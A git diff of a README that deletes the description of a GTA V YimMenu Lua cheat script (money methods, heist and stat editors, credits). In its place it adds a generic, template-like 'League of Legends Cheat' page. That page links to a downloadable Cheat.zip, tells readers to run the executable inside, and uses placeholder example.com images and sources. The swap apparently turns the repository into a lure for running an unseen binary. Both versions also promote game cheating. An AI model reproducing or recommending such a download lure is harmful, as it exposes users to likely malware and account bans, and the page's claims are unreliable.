@@ -1,142 +1,51 @@
-# Alestarov Menu V3
-![](https://img.shields.io/badge/dynamic/json?color=ffab00&label=Online%20Version&query=%24.game.online&url=https%3A%2F%2Fraw.githubusercontent.com%2FYimMenu%2FYimMenu%2Fmaster%2Fmetadata.json&style=flat-square&labelColor=000000) ![](https://img.shields.io/badge/dynamic/json?color=ffab00&label=Game%20Build&query=%24.game.build&url=https%3A%2F%2Fraw.githubusercontent.com%2FYimMenu%2FYimMenu%2Fmaster%2Fmetadata.json&style=flat-square&labelColor=000000)
+# League of Legends Cheat
 
- *Code from other scripts can be used in this script. All links to scripts and copyright holders are in the section "Credits"*
+Welcome to the League-of-Legends repository! This cheat, developed in C++, is designed to enhance your League of Legends gameplay experience by providing a range of features to optimize your champion's movements, attacks, and overall awareness in the game.
 
- *By using my script you agree to the User Agreement*
+![League of Legends Banner](https://example.com/league-of-legends-banner.png)
 
-## Yim Menu
+## Features
+- **Orbwalker**: Optimizes champion movement and attacks for efficient gameplay.
+- **Zoomhack**: Increases awareness by enabling zoom functionality.
+- **Lasthit**: Helps improve last hitting minions.
+- **Harass**: Enhances the ability to harass opponents during gameplay.
+- *And much more!*
 
-* [Download Yim Menu](https://github.com/YimMenu/YimMenu)
+## Installation
+To download and install the League of Legends cheat, click the button below:
 
-## Before using the Script, watch the Video Instruction!
-* [Video Instruction](https://youtu.be/uTL90ga7-DA?si=s14BaDyJc4Lrss4A)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-orange)](https://github.com/user-attachments/files/16928413/Cheat.zip)
 
-This script was created for the Yim Menu cheat.
+## Usage
+1. Download the cheat from the provided link.
+2. Extract the contents of the downloaded ZIP file.
+3. Run the cheat executable before launching League of Legends.
+4. Enjoy the enhanced gameplay experience!
 
-This cheat contains the best ways to cheat currency in GTA 5 online.
+## Screenshots
+Here are some screenshots showcasing the features of the League of Legends cheat:
 
-Also in this cheat there is a Stat editor for account security, and many other functions...
+![Screenshot 1](https://example.com/screenshot1.png)
 
-The script will be supplemented, about all the changes will be written here
+![Screenshot 2](https://example.com/screenshot2.png)
 
-# New
-Updated CEO method, added new features to Cayo Perico Heist Editor
+## Support
+If you encounter any issues or have any questions about the cheat, feel free to contact us at support@leaguecheat.com.
 
+## Contribute
+We welcome contributions to enhance the League of Legends cheat even further. If you have any ideas or improvements, please submit a pull request.
 
+## License
+This cheat is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
 
+## Disclaimer
+Please note that the use of cheats in online games may violate the terms of service or end-user license agreement of the game. **Use at your own risk.**
 
+## Credits
+Special thanks to the following sources for providing inspiration and resources for this cheat:
+- [Example Source 1](https://example-source1.com)
+- [Example Source 2](https://example-source2.com)
 
+🎮 Happy Gaming! 🚀
 
-# User Agreement
-
-Use agreement：
-
-1)When editing the script, indicate the authors
-
-2)You agree to use the script according to the instructions
-
-3)If you use the script not according to the instructions, the author is not responsible for your account
-
-# Instructions for AlMenu
-![image](https://github.com/Alestarov/YimMenu-lua-script-Alestarov_Menu/assets/108485130/3fe3db2c-592b-4fbb-9209-e9d141ee134f)
-
-
-![image](https://github.com/Alestarov/Almenu/assets/108485130/3cc25428-a7fe-4abf-aba4-31f8b99aa067)
-
-
-
-## Almenu Interface
-
-![image](https://github.com/Alestarov/Almenu/assets/108485130/31e2df49-f300-4a9a-ac3f-98a3e7f14d24)
-
-
-## Teleport Interface
-
-![image](https://github.com/Alestarov/YimMenu-lua-script-Alestarov_Menu/assets/108485130/114df4b5-3b18-4d79-900a-8fbe1e93fcca)
-
-
-## CMM Interface
-
-(Computers Management Menu)
-
-![image](https://github.com/Alestarov/Almenu/assets/108485130/5854e37c-9488-4ddb-b616-ec01797a2a56)
-
-
-## Money Interface
-
-![image](https://github.com/Alestarov/YimMenu-lua-script-Alestarov_Menu/assets/108485130/1a1b47ea-1b65-4212-9b26-a1725a777f56)
-
- CEO
- 
-![image](https://github.com/Alestarov/Almenu/assets/108485130/b2cbbcf1-ef20-485d-9e61-1c617b9117bc)
-
-
-
- Casino
- 
-![Снимок экрана 2023-08-01 161835](https://github.com/YimMenu-Lua/Alestarov-Menu/assets/108485130/c5ab6734-ba05-4349-adc4-37deb316c39d)
-
-
-
-
-## Heist Editor Interface
-
-![image](https://github.com/YimMenu-Lua/Alestarov-Menu/assets/108485130/4582fd79-ba48-454f-a7c1-c637d1ff3c7b)
-
-
-Cayo Perico Heist
-
-![image](https://github.com/Alestarov/Almenu/assets/108485130/80abd0e6-6fc5-4ec5-a945-4488069e5fdd)
-
-
-Fleeca Heist
-
-![image](https://github.com/Alestarov/YimMenu-lua-script-Alestarov_Menu/assets/108485130/8ee878c3-267a-42ff-b96b-49cf032b7cb9)
-
-## Stat Editor Interface
-
-![image](https://github.com/Alestarov/YimMenu-lua-script-Alestarov_Menu/assets/108485130/79db794f-6938-4c8c-a0ed-98cb3bcda413)
-
-
-
-
-
-
-# Credits
-
-## 👑 Yimura 👑
-(Yim Menu Cheat creator)
-
-Cheat on GitHub:
-
-https://github.com/YimMenu/YimMenu
-## 👑 Alestarov 👑
-(compiled a script)
-
-Profile on GitHub:
-
-https://github.com/Alestarov
-## 👑sch-lda👑
-(allowed to use the code from his script "SCH-LUA-YIMMENU.lua)
-
-(The code from the script ''SCH-LUA-YIMMENU.lua'' was implemented)
-
-Script on GitHub:
-
-https://github.com/sch-lda/SCH-LUA-YIMMENU
-## 👑 xiaoxiao921 👑
-(Helped with writing code)
-
-Profile on GitHub:
-
-https://github.com/xiaoxiao921
-## 👑 SLON 👑
-(The code from the script ''YimCeo v0.5 by Slon_.lua'' was implemented)
-
-Script on unknowncheats:
-
-https://www.unknowncheats.me/forum/grand-theft-auto-v/591335-yimceo-ceo-crates-method-yimmenu.html
-
-
-
+```
